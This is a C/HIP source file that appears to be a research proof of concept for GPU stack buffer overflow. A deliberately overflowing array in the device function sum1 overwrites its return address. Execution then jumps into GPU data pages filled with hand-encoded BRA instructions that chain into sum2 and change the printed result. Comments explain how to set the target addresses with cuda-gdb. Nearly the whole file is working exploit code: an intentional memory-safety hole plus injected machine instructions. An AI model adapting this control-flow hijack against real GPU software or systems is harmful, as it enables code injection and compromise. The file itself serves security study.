#include "stdio.h"
#include "stdlib.h"
#include "fcntl.h"
#include "errno.h"
#include "inttypes.h"
#include "sys/mman.h"
#include "hip/hip_runtime.h"
#include "sched.h"
#include "unistd.h"

#define PAGE_SIZE (2*1024*1024)
#define PAGE_NUM 16
#define ALLOC_SIZE 1024*128

/* 
    modify the following values based on the info from cuda-gdb.
    BUF_ADDR_START is the value of list[0].
    SUM1_ADDR and SUM2_ADDR are the base addrs of sum1 and sum2.
    RET_OFFSET is the the correct return addr in sum1 (when it's called by sum1), 
    relative to the base addr of sum1.
    DIS_RET_ADDR is the distance (in 4B) between arr[0] and return addr on the stack of 
    sum1 (when it's called by sum1).
*/
#define BUF_ADDR_START 0x7fffd7c00000
#define SUM1_ADDR 0x7fffd6facf00
#define SUM2_ADDR 0x7fffd6faf200
#define RET_OFFSET 0x9e0
#define DIS_RET_ARR 21

/* 
    modify the following values to control buffer overflow.
    The return addr in sum1 (line 92) is overwritten when ARR_OFFSET = DIS_RET_ARR.
    When the return happens, it returns to the data page at list[0] and executes the 
    data (interpreted as instructions) in this page. 
    The page at list[0] has a BRA instruction that jumps to the page at list[1].
    The page at list[1] has a BRA instruction that jumps to the page at list[2].
    ...
    The page at list[PAGE_NUM-1] has a BRA instruction that jumps to sum2.
    When code in sum2 is executed, it returns the wrong result to k1.
    With no overflow, the correct result (printed) is 1.
    With overflow, the wrong result (printed) is 11.
*/    
#define ARR_OFFSET 21




typedef uint32_t(*pF)(uint32_t k, uint32_t*a, uint32_t depth, uint32_t value_ptr, uint32_t arr_idx);
extern int errno;



/*
    sum2 should never be executed (unless buffer overflow happens).
    The only difference between sum2 and sum1 is line 67; an extra "10" is added in sum2.
*/
__device__ __noinline__
uint32_t sum2(uint32_t k, uint32_t*a,  uint32_t depth,  uint32_t value_ptr, uint32_t arr_idx)
{
    uint32_t arr1[16];
    for(int i = 0; i < 16; i++){
        arr1[i] = 0xdeadbeef * a[i+depth];
    }
    arr1[arr_idx] = BUF_ADDR_START - 0x7fff00000000;

    if(k > 0)
        return(a[value_ptr]+ sum2(k-1, a,  depth+1, value_ptr+1, arr_idx+ARR_OFFSET)+10);
    else
    {
        
        uint32_t m = 1;
        return m+a[value_ptr];
    }

}

/*
   sum1 provides the summation of cetain items in the buffer "a".
   arr1 does not contribute to the summation result, but it can trigger a buffer overflow, 
   depending on ARR_OFFSET.
   depth is used to avoid compiler optimization.   
*/

__device__ __noinline__
uint32_t sum1(uint32_t k, uint32_t*a,  uint32_t depth,  uint32_t value_ptr, uint32_t arr_idx)
{
    uint32_t arr1[16];
    for(int i = 0; i < 16; i++){
        arr1[i] = 0xdeadbeef * a[i+depth];
    }

    arr1[arr_idx] = BUF_ADDR_START - 0x7fff00000000;

    if(k > 0)
        return(a[value_ptr] + sum1(k-1, a,  depth+1, value_ptr+1, arr_idx+ARR_OFFSET));
    else
    {
        
        uint32_t m = 1;
        return m+a[value_ptr];
    }

}


/*
   mem_init initiates the gpu buffer "a".
   k1 performs a summation over items within the range of a[0] to a[99].
   a[100] and a[101] are used to store some metadata for the summation.
*/
__global__
void mem_init (uint32_t *a, bool value)
{

    for(uint64_t x = 0; x < ALLOC_SIZE/sizeof(uint32_t); x++)
        a[x] = x%1;
    a[100] = 13; //a[100] stores value_idx for sum1.
    a[101] = 0;  //a[101] stores arr_idx for sum1.

}



__global__
void k1 (uint32_t* a, uint32_t* b, uint64_t* list_start)
{
    uint32_t m = 1;
    
    pF fp[2]; //use function pointer to get the function addrs.
    fp[0] = sum1;
    fp[1] = sum2;

    /* perform summation over two items in the buffer "a" */
    m = sum1(0x1, a, 0, a[100],a[101]);
    b[0] = m;
        
}


/* Write a BRA instruction in page1, with the jumping target being page2.*/
__global__ void
link(uint64_t *page1, uint64_t *page2)
{
    int64_t addr1 = (int64_t)page1 + 16;
    int64_t addr2 = (int64_t)page2;
    int64_t offset = addr2 - addr1;
    
    uint64_t offset_lo = (offset & 0x00000000FFFFFFFF) << 32;
    uint64_t offset_hi = (offset >> 32) & 0x000000000003FFFF;
    
    uint64_t bra_lo = 0x0000000000007947 | offset_lo;
    uint64_t bra_hi = 0x003fde0003800000 | offset_hi;
    
    page1[0] = bra_lo;
    page1[1] = bra_hi;
}



int main()
{

    
    setvbuf(stdout, NULL, _IOLBF, 0);
    hipError_t status;

    uint32_t *da;
    status = hipMalloc((void**)&da, ALLOC_SIZE);
    if(status != hipSuccess)
        printf("ERROR!!!\n");

    uint32_t *db;
    status = hipMallocManaged((void**)&db, sizeof(uint32_t));
    if(status != hipSuccess)
        printf("ERROR!!!\n");

    mem_init<<<1, 1>>>(da, 1);
    hipDeviceSynchronize();

    uint64_t *list[PAGE_NUM]; //the linked data pages

    for(int i = 0; i < PAGE_NUM; i++)
    {
        status = hipMalloc(&list[i], PAGE_SIZE);
        if(status != hipSuccess)
            printf("ERROR!!!\n");
    }

    /* Fill the first (PAGE_NUM-1) pages with BRA instructions to link them. */
    for(int i = 0; i < PAGE_NUM - 1; i++)
        link<<<1,1>>>(list[i], list[i+1]);
    hipDeviceSynchronize();

    //uint64_t* ptr_tmp = (uint64_t*)(SUM1_ADDR+RET_OFFSET);
    uint64_t* ptr_tmp = (uint64_t*)(SUM2_ADDR+RET_OFFSET);

    /* The BRA instruction in the last page jumps to sum2.*/
    link<<<1,1>>>(list[PAGE_NUM-1], ptr_tmp);
    hipDeviceSynchronize();
    
    k1<<<1, 1>>>(da, db, list[0]);
    hipDeviceSynchronize();


    status = hipGetLastError();
    if(status != hipSuccess)
        printf("%s\n", hipGetErrorString(status));
    else
        printf("%u\n", db[0]);

    return 0;
}

